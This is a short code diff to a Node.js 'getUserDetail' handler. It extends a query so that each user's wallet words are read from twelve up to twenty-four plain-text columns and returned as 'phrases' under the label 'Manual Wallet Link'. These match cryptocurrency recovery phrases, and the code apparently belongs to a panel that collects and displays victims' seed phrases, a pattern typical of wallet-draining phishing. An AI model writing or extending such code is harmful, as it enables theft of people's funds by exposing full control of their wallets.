@@ -71,11 +71,18 @@ exports.getUserDetail = async (req, res) => {
 
     // Check old wallet table
     const [oldWallets] = await db.query(
-      "SELECT type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve, created_at FROM wallet WHERE user_id = $1",
+      `SELECT type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve,
+              thirteen, fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty,
+              twenty_one, twenty_two, twenty_three, twenty_four, created_at
+       FROM wallet WHERE user_id = $1`,
       [userId]
     );
     oldWallets.forEach(w => {
-      const words = [w.one, w.two, w.three, w.four, w.five, w.six, w.seven, w.eight, w.nine, w.ten, w.eleven, w.twelve].filter(Boolean);
+      const words = [
+        w.one, w.two, w.three, w.four, w.five, w.six, w.seven, w.eight, w.nine, w.ten, w.eleven, w.twelve,
+        w.thirteen, w.fourteen, w.fifteen, w.sixteen, w.seventeen, w.eighteen, w.nineteen, w.twenty,
+        w.twenty_one, w.twenty_two, w.twenty_three, w.twenty_four
+      ].filter(Boolean);
       if (words.length > 0) {
         phrases.push({
           source: "Manual Wallet Link",
